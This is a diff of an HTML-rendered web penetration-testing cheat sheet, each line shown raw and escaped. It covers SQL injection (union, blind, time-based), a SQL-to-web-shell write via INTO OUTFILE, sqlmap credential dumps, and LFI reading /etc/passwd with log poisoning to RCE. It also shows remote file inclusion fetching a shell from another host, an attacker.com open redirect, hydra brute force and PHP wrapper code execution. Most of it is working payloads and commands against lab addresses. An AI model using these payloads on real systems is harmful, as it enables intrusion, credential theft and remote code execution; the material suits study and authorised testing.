+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;administration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,3,4,5 %25&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--Test until find the number of fields&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;administration&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,version(),user(),database()&apos;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;blind-sql-injection&quot;&gt;Blind SQL Injection&lt;/h3&gt;
+&lt;p&gt;When we dont have error response.&lt;/p&gt;
 
-<h3 id="blind-post-sqli">Blind Post SQLi</h3>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">login</span><span class="o">=</span><span class="n">test</span><span class="s1">' and length(database()) = 7 '</span> <span class="c1">-- Will do request until to find the right lenght of database name</span>
+&lt;h3 id=&quot;blind-post-sqli&quot;&gt;Blind Post SQLi&lt;/h3&gt;
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; and length(database()) = 7 &apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Will do request until to find the right lenght of database name&lt;/span&gt;
 
-<span class="n">login</span><span class="o">=</span><span class="n">test</span><span class="s1">' and ascii(substring(database(),1,1)) = 100 #'</span> <span class="c1">-- Will check character of the name until find all</span>
+&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; and ascii(substring(database(),1,1)) = 100 #&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Will check character of the name until find all&lt;/span&gt;
 
-<span class="n">login</span><span class="o">=</span><span class="n">test</span><span class="s1">' and (select length(group_concat(table_name))) = 35 from information_schema.tables where table_schema="dbtest")#'</span> <span class="c1">-- To discover the name lenght of the tables. Repeat  the same steps to find the names, character by character.</span>
-</code></pre></div></div>
+&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; and (select length(group_concat(table_name))) = 35 from information_schema.tables where table_schema=&quot;dbtest&quot;)#&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- To discover the name lenght of the tables. Repeat  the same steps to find the names, character by character.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="time-based-sql-injection">Time based SQL Injection</h3>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">test</span><span class="o">=</span><span class="s1">' or sleep(5)#'</span> <span class="c1">-- If sleep 6 sec is working the command. </span>
+&lt;h3 id=&quot;time-based-sql-injection&quot;&gt;Time based SQL Injection&lt;/h3&gt;
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; or sleep(5)#&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- If sleep 6 sec is working the command. &lt;/span&gt;
 
-<span class="n">test</span><span class="o">=</span><span class="s1">' or if (database() = char(100,98,109,114,116,117,114), sleep(3),0)#'</span> <span class="c1">-- If was right the comparison will sleep.</span>
-</code></pre></div></div>
+&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; or if (database() = char(100,98,109,114,116,117,114), sleep(3),0)#&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- If was right the comparison will sleep.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="sql-to-rce">SQL TO RCE</h3>
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">adm</span><span class="o">/</span><span class="n">test</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">ps</span><span class="o">=</span><span class="s1">'union all select 1,2,3,4,"&lt;?php system($_GET['</span><span class="n">cmd</span><span class="s1">']);?&gt;" INTO OUTFILE "/var/www/html/adm/banners/rce.php" %23'</span> 
+&lt;h3 id=&quot;sql-to-rce&quot;&gt;SQL TO RCE&lt;/h3&gt;
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ps&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union all select 1,2,3,4,&quot;&amp;lt;?php system($_GET[&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;]);?&amp;gt;&quot; INTO OUTFILE &quot;/var/www/html/adm/banners/rce.php&quot; %23&apos;&lt;/span&gt; 
 
-<span class="mi">172</span><span class="p">.</span><span class="mi">16</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">10</span><span class="o">/</span><span class="n">adm</span><span class="o">/</span><span class="n">banners</span><span class="o">/</span><span class="n">rce</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">ifconfig</span>
-</code></pre></div></div>
-<h3 id="sqlmap">SqlMap</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> —current-db 
-sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> —dbs 
-sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> <span class="nt">-D</span> databasename —tables 
-sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> <span class="nt">-D</span> databasename <span class="nt">-T</span> tablename —columns 
-sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> <span class="nt">-D</span> databasename <span class="nt">-C</span> <span class="s1">'login,pass'</span> —dump 
-sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> —current-user 
-sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php?ulp=sp"</span> —users 
-sqlmap <span class="nt">-u</span> <span class="s2">"172.100.1.10/adm/test.php"</span> —forms 
-</code></pre></div></div>
+&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adm&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;banners&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ifconfig&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h3 id=&quot;sqlmap&quot;&gt;SqlMap&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; —current-db 
+sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; —dbs 
+sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; databasename —tables 
+sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; databasename &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; tablename —columns 
+sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; databasename &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;login,pass&apos;&lt;/span&gt; —dump 
+sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; —current-user 
+sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php?ulp=sp&quot;&lt;/span&gt; —users 
+sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;172.100.1.10/adm/test.php&quot;&lt;/span&gt; —forms 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="xss-cross-site-scripting">XSS Cross Site Scripting</h2>
-<p>Links:</p>
-<ul>
-  <li><a href="https://brutelogic.com.br/blog/">Brutelogic</a></li>
-</ul>
+&lt;h2 id=&quot;xss-cross-site-scripting&quot;&gt;XSS Cross Site Scripting&lt;/h2&gt;
+&lt;p&gt;Links:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://brutelogic.com.br/blog/&quot;&gt;Brutelogic&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-<h3 id="reflect">Reflect</h3>
+&lt;h3 id=&quot;reflect&quot;&gt;Reflect&lt;/h3&gt;
 
-<h3 id="self-xss">Self-XSS</h3>
-<p>The script go to the page.</p>
+&lt;h3 id=&quot;self-xss&quot;&gt;Self-XSS&lt;/h3&gt;
+&lt;p&gt;The script go to the page.&lt;/p&gt;
 
-<h3 id="stored-xss">Stored XSS</h3>
-<p>When is possible salve a code in the page, so every time that the page is load the script execute. Can steal cookies, passwords, etc.</p>
+&lt;h3 id=&quot;stored-xss&quot;&gt;Stored XSS&lt;/h3&gt;
+&lt;p&gt;When is possible salve a code in the page, so every time that the page is load the script execute. Can steal cookies, passwords, etc.&lt;/p&gt;
 
-<h3 id="dom-xss">Dom XSS</h3>
+&lt;h3 id=&quot;dom-xss&quot;&gt;Dom XSS&lt;/h3&gt;
 
-<h3 id="automation">Automation</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 xsstrike <span class="nt">-u</span> <span class="s2">"http://172.16.10.1/turismo/procurar.php?busca="</span> <span class="c"># Test parameters</span>
-python3 xsstrike <span class="nt">-u</span> <span class="s2">"http://172.16.10.1/turismo/procurar.php"</span> <span class="c"># Find parameters in page</span>
-python3 xsstrike <span class="nt">-u</span> <span class="s2">"http://172.16.10.1/turismo/procurar.php/"</span> —path <span class="c"># Search by self-xss</span>
-</code></pre></div></div>
+&lt;h3 id=&quot;automation&quot;&gt;Automation&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 xsstrike &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://172.16.10.1/turismo/procurar.php?busca=&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Test parameters&lt;/span&gt;
+python3 xsstrike &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://172.16.10.1/turismo/procurar.php&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Find parameters in page&lt;/span&gt;
+python3 xsstrike &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://172.16.10.1/turismo/procurar.php/&quot;&lt;/span&gt; —path &lt;span class=&quot;c&quot;&gt;# Search by self-xss&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="lfi-local-file-inclusion">LFI Local File Inclusion</h2>
-<p>Application receive a parameter that execeute a command direct, without handling the input.</p>
-<ul>
-  <li>172.16.1.10/administration/info.php?p=/../../../../etc/passwd -&gt; Read</li>
-  <li>172.16.1.10/administration/info.php?p=/../../../../etc/passwd%00 -&gt; Null byte bypass.</li>
-</ul>
+&lt;h2 id=&quot;lfi-local-file-inclusion&quot;&gt;LFI Local File Inclusion&lt;/h2&gt;
+&lt;p&gt;Application receive a parameter that execeute a command direct, without handling the input.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;172.16.1.10/administration/info.php?p=/../../../../etc/passwd -&amp;gt; Read&lt;/li&gt;
+  &lt;li&gt;172.16.1.10/administration/info.php?p=/../../../../etc/passwd%00 -&amp;gt; Null byte bypass.&lt;/li&gt;
+&lt;/ul&gt;
 
-<p>LFI to RCE - Log infection</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>172.16.1.10/administration/info.php?p<span class="o">=</span>/../../../../var/log/apache2/access.log <span class="c"># Read a log file. in this case the apche log.</span>
+&lt;p&gt;LFI to RCE - Log infection&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;172.16.1.10/administration/info.php?p&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/../../../../var/log/apache2/access.log &lt;span class=&quot;c&quot;&gt;# Read a log file. in this case the apche log.&lt;/span&gt;
 
-nc <span class="nt">-v</span> 172.16.1.10 80 <span class="nt">-C</span> &lt;?php system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">'p'</span><span class="o">])</span><span class="p">;</span> ?&gt; <span class="c"># Sending data to register in log</span>
+nc &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; 172.16.1.10 80 &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &amp;lt;?php system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;p&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ?&amp;gt; &lt;span class=&quot;c&quot;&gt;# Sending data to register in log&lt;/span&gt;
 
-172.16.1.10/administration/info.php?p<span class="o">=</span>/../../../../var/log/apache2/access.log&amp;p<span class="o">=</span>whereis nc <span class="c"># Execute the rce in log file.</span>
-</code></pre></div></div>
-<h2 id="rfi--remote-file-inclusion">RFI  Remote File Inclusion</h2>
-<p>It’s possible to include a remote file in system.</p>
-<ul>
-  <li>172.16.1.10/administration/link.php?link=https://172.90.0.37:8080/shell&amp;p=id</li>
-</ul>
+172.16.1.10/administration/info.php?p&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/../../../../var/log/apache2/access.log&amp;amp;p&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;whereis nc &lt;span class=&quot;c&quot;&gt;# Execute the rce in log file.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;rfi--remote-file-inclusion&quot;&gt;RFI  Remote File Inclusion&lt;/h2&gt;
+&lt;p&gt;It’s possible to include a remote file in system.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;172.16.1.10/administration/link.php?link=https://172.90.0.37:8080/shell&amp;amp;p=id&lt;/li&gt;
+&lt;/ul&gt;
 
-<h2 id="html-injection">HTML Injection</h2>
-<p>It’s possible inject a html in the page.</p>
-<ul>
-  <li>“172.16.1.10/administration/search.php?ps=<a href="http://172.90.0.37/">&lt;h1&gt;Amazing link hacker&lt;/h1&gt;</a></li>
-</ul>
+&lt;h2 id=&quot;html-injection&quot;&gt;HTML Injection&lt;/h2&gt;
+&lt;p&gt;It’s possible inject a html in the page.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;“172.16.1.10/administration/search.php?ps=&lt;a href=&quot;http://172.90.0.37/&quot;&gt;&amp;lt;h1&amp;gt;Amazing link hacker&amp;lt;/h1&amp;gt;&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-<h2 id="path-traversal--directory-traversal">Path Traversal | Directory Traversal</h2>
-<ul>
-  <li>172.16.1.10/administration/test.php?banners=/ -&gt; Will list all files inside the directory.</li>
-  <li>172.16.1.10/administration/test.php?banners=/../ -&gt; Will back one directory in path.</li>
-</ul>
+&lt;h2 id=&quot;path-traversal--directory-traversal&quot;&gt;Path Traversal | Directory Traversal&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;172.16.1.10/administration/test.php?banners=/ -&amp;gt; Will list all files inside the directory.&lt;/li&gt;
+  &lt;li&gt;172.16.1.10/administration/test.php?banners=/../ -&amp;gt; Will back one directory in path.&lt;/li&gt;
+&lt;/ul&gt;
 
-<h2 id="command-injection">Command injection</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>commix <span class="nt">--url</span> http://172.16.1.10/hosting —data<span class="o">=</span><span class="s2">"site=whoami"</span> : 
-</code></pre></div></div>
-<h2 id="path-disclosure">Path disclosure</h2>
-<p>When we can see the application path.</p>
-<ul>
-  <li>/var/www/html/adminstration/index.php</li>
-</ul>
+&lt;h2 id=&quot;command-injection&quot;&gt;Command injection&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;commix &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://172.16.1.10/hosting —data&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;site=whoami&quot;&lt;/span&gt; : 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;path-disclosure&quot;&gt;Path disclosure&lt;/h2&gt;
+&lt;p&gt;When we can see the application path.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;/var/www/html/adminstration/index.php&lt;/li&gt;
+&lt;/ul&gt;
 
-<h2 id="open-redirect">Open redirect</h2>
-<p>Is a redirect that allow to change the destination to our target.</p>
-<ul>
-  <li>www.test.com/redirect.php?url=http://attacker.com</li>
-</ul>
+&lt;h2 id=&quot;open-redirect&quot;&gt;Open redirect&lt;/h2&gt;
+&lt;p&gt;Is a redirect that allow to change the destination to our target.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;www.test.com/redirect.php?url=http://attacker.com&lt;/li&gt;
+&lt;/ul&gt;
 
-<h2 id="brute-force">Brute force</h2>
-<p>Hydra</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-v</span> <span class="nt">-L</span> users.txt <span class="nt">-P</span> pass.txt 172.16.1.10 http-post-form <span class="s2">"/adm/login.php:login=^USER^&amp;PASS=^PASS^&amp;Login:FAIL"</span>
-</code></pre></div></div>
+&lt;h2 id=&quot;brute-force&quot;&gt;Brute force&lt;/h2&gt;
+&lt;p&gt;Hydra&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hydra &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; users.txt &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; pass.txt 172.16.1.10 http-post-form &lt;span class=&quot;s2&quot;&gt;&quot;/adm/login.php:login=^USER^&amp;amp;PASS=^PASS^&amp;amp;Login:FAIL&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="source-code-analisys">Source Code analisys</h2>
+&lt;h2 id=&quot;source-code-analisys&quot;&gt;Source Code analisys&lt;/h2&gt;
 
-<h2 id="php-wrappers">PHP wrappers</h2>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://test.com/index.php?page<span class="o">=</span>data://text/plan<span class="p">;</span><span class="nb">base64</span>,hash 
+&lt;h2 id=&quot;php-wrappers&quot;&gt;PHP wrappers&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://test.com/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data://text/plan&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt;,hash 
 
-http://test.com/index.php?page<span class="o">=</span>data://text/plan<span class="p">;</span>&lt;?php system<span class="o">(</span><span class="nb">id</span><span class="o">)</span>?&gt;
-</code></pre></div></div>
-<h2 id="cms">CMS</h2>
-<h3 id="wordpress">Wordpress</h3>
-<ul>
-  <li><a href="http://wpvulndb.com">wpvulndb.com</a>: Vulnetabilities database</li>
-</ul>
+http://test.com/index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;data://text/plan&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&amp;lt;?php system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;cms&quot;&gt;CMS&lt;/h2&gt;
+&lt;h3 id=&quot;wordpress&quot;&gt;Wordpress&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;http://wpvulndb.com&quot;&gt;wpvulndb.com&lt;/a&gt;: Vulnetabilities database&lt;/li&gt;
+&lt;/ul&gt;
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan —url http://test.com/blog —api-token token
-</code></pre></div></div>
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wpscan —url http://test.com/blog —api-token token
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h3 id="joomla">JOOMLA</h3>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joomscan <span class="nt">-u</span> http://172.100.0.106
-</code></pre></div></div>
+&lt;h3 id=&quot;joomla&quot;&gt;JOOMLA&lt;/h3&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;joomscan &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://172.100.0.106
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="webdav">Webdav</h2>
-<p>Is a set of extensions for the HTTP.</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cadaver http://172.16.1.10/webdav/ <span class="c"># Open a connection to execute commands</span>
+&lt;h2 id=&quot;webdav&quot;&gt;Webdav&lt;/h2&gt;
+&lt;p&gt;Is a set of extensions for the HTTP.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cadaver http://172.16.1.10/webdav/ &lt;span class=&quot;c&quot;&gt;# Open a connection to execute commands&lt;/span&gt;
 
-davtest <span class="nt">-url</span> http://172.16.1.10/webdav/ <span class="c"># Upload files and execute it.</span>
-</code></pre></div></div>
+davtest &lt;span class=&quot;nt&quot;&gt;-url&lt;/span&gt; http://172.16.1.10/webdav/ &lt;span class=&quot;c&quot;&gt;# Upload files and execute it.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-<h2 id="xxe">XXE</h2>
